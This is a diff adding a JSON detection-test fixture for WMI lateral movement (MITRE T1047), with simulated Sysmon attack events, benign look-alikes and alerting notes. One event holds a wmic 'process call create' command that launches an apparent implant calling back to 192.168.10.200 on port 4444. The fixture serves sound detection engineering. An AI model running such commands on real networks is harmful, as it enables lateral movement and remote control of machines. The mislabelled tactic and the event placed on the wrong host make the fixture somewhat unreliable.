@@ -1,0 +1,234 @@
+{
+  "technique_id": "T1047",
+  "technique_name": "Detection for T1047 — Remote/local WMI execution",
+  "description": "Simulates Detection for T1047 — Remote/local WMI execution attack sequence",
+  "mitre_tactic": "unknown",
+  "events": {
+    "attack_sequence": [
+      {
+        "@timestamp": "2026-03-22T09:14:32.441Z",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "action": "Process Create (rule: ProcessCreate)",
+          "code": "1"
+        },
+        "process": {
+          "pid": 5832,
+          "name": "wmic.exe",
+          "executable": "C:\\Windows\\System32\\wbem\\wmic.exe",
+          "command_line": "wmic.exe /node:192.168.10.45 process call create \"C:\\Users\\clee\\AppData\\Local\\Temp\\sync_agent.exe -s 192.168.10.200 -p 4444\"",
+          "parent": {
+            "pid": 7104,
+            "name": "sync_agent.exe",
+            "executable": "C:\\Users\\clee\\AppData\\Local\\Temp\\sync_agent.exe"
+          }
+        },
+        "user": {
+          "name": "clee",
+          "domain": "CORP"
+        },
+        "host": {
+          "name": "WS-FINANCE-01",
+          "os": {
+            "platform": "windows"
+          }
+        },
+        "agent": {
+          "type": "sysmon"
+        },
+        "_simulation": {
+          "type": "attack",
+          "technique": "T1047",
+          "sequence_order": 1,
+          "sequence_total": 3,
+          "description": "Fawkes wmi command — wmic.exe used to remotely create a process on a lateral target, spawned from the C2 implant"
+        }
+      },
+      {
+        "@timestamp": "2026-03-22T09:14:33.819Z",
+        "event": {
+          "category": "network",
+          "type": "connection",
+          "action": "Network connection detected (rule: NetworkConnect)",
+          "code": "3"
+        },
+        "process": {
+          "pid": 5832,
+          "name": "wmic.exe",
+          "executable": "C:\\Windows\\System32\\wbem\\wmic.exe"
+        },
+        "destination": {
+          "ip": "192.168.10.45",
+          "port": 135
+        },
+        "source": {
+          "ip": "192.168.10.12",
+          "port": 49712
+        },
+        "network": {
+          "direction": "egress",
+          "transport": "tcp"
+        },
+        "user": {
+          "name": "clee",
+          "domain": "CORP"
+        },
+        "host": {
+          "name": "WS-FINANCE-01",
+          "os": {
+            "platform": "windows"
+          }
+        },
+        "agent": {
+          "type": "sysmon"
+        },
+        "_simulation": {
+          "type": "attack",
+          "technique": "T1047",
+          "sequence_order": 2,
+          "sequence_total": 3,
+          "description": "wmic.exe initiates DCE/RPC connection to remote host on port 135 as part of WMI lateral movement"
+        }
+      },
+      {
+        "@timestamp": "2026-03-22T09:14:35.207Z",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "action": "Process Create (rule: ProcessCreate)",
+          "code": "1"
+        },
+        "process": {
+          "pid": 6120,
+          "name": "WmiPrvSE.exe",
+          "executable": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+          "command_line": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -secured -Embedding",
+          "parent": {
+            "pid": 860,
+            "name": "svchost.exe",
+            "executable": "C:\\Windows\\System32\\svchost.exe"
+          }
+        },
+        "user": {
+          "name": "clee",
+          "domain": "CORP"
+        },
+        "host": {
+          "name": "WS-FINANCE-01",
+          "os": {
+            "platform": "windows"
+          }
+        },
+        "agent": {
+          "type": "sysmon"
+        },
+        "_simulation": {
+          "type": "attack",
+          "technique": "T1047",
+          "sequence_order": 3,
+          "sequence_total": 3,
+          "description": "WmiPrvSE.exe spawned by svchost under attacker user context — indicates WMI provider host activated to execute remote process call on behalf of clee"
+        }
+      }
+    ],
+    "benign_similar": [
+      {
+        "@timestamp": "2026-03-22T08:45:11.003Z",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "action": "Process Create (rule: ProcessCreate)",
+          "code": "1"
+        },
+        "process": {
+          "pid": 3276,
+          "name": "wmic.exe",
+          "executable": "C:\\Windows\\System32\\wbem\\wmic.exe",
+          "command_line": "wmic.exe os get Caption,Version,BuildNumber /format:csv",
+          "parent": {
+            "pid": 2104,
+            "name": "cmd.exe",
+            "executable": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "user": {
+          "name": "clee",
+          "domain": "CORP"
+        },
+        "host": {
+          "name": "WS-FINANCE-01",
+          "os": {
+            "platform": "windows"
+          }
+        },
+        "agent": {
+          "type": "sysmon"
+        },
+        "_simulation": {
+          "type": "benign_similar",
+          "technique": "T1047",
+          "description": "IT helpdesk script using wmic.exe locally to query OS version for inventory reporting — no /node flag, no process call create, no suspicious parent"
+        }
+      },
+      {
+        "@timestamp": "2026-03-22T08:51:44.772Z",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "action": "Process Create (rule: ProcessCreate)",
+          "code": "1"
+        },
+        "process": {
+          "pid": 4488,
+          "name": "WmiPrvSE.exe",
+          "executable": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+          "command_line": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -secured -Embedding",
+          "parent": {
+            "pid": 860,
+            "name": "svchost.exe",
+            "executable": "C:\\Windows\\System32\\svchost.exe"
+          }
+        },
+        "user": {
+          "name": "SYSTEM",
+          "domain": "NT AUTHORITY"
+        },
+        "host": {
+          "name": "WS-FINANCE-01",
+          "os": {
+            "platform": "windows"
+          }
+        },
+        "agent": {
+          "type": "sysmon"
+        },
+        "_simulation": {
+          "type": "benign_similar",
+          "technique": "T1047",
+          "description": "WmiPrvSE.exe spawned under NT AUTHORITY\\SYSTEM — routine WMI provider activation for Windows health telemetry or SCCM inventory, not user-initiated and not associated with a suspicious parent"
+        }
+      }
+    ]
+  },
+  "expected_detection": {
+    "should_alert_on": "attack_sequence",
+    "should_not_alert_on": "benign_similar",
+    "key_fields": [
+      "process.name",
+      "process.command_line",
+      "process.parent.name",
+      "process.parent.executable",
+      "user.name",
+      "destination.port"
+    ],
+    "notes": "High-signal indicators for T1047: (1) wmic.exe with '/node:' flag AND 'process call create' in command_line — almost exclusively malicious; (2) WmiPrvSE.exe spawned under a non-SYSTEM interactive user context (e.g., CORP\\clee) indicates attacker-controlled WMI activation. Benign WmiPrvSE.exe runs as SYSTEM. Tune out SCCM/ConfigMgr service accounts which legitimately use remote WMI with 'process call create' in managed endpoints."
+  },
+  "log_sources_used": [
+    "sysmon_1",
+    "sysmon_3"
+  ],
+  "platforms": [
+    "windows"
+  ]
+}
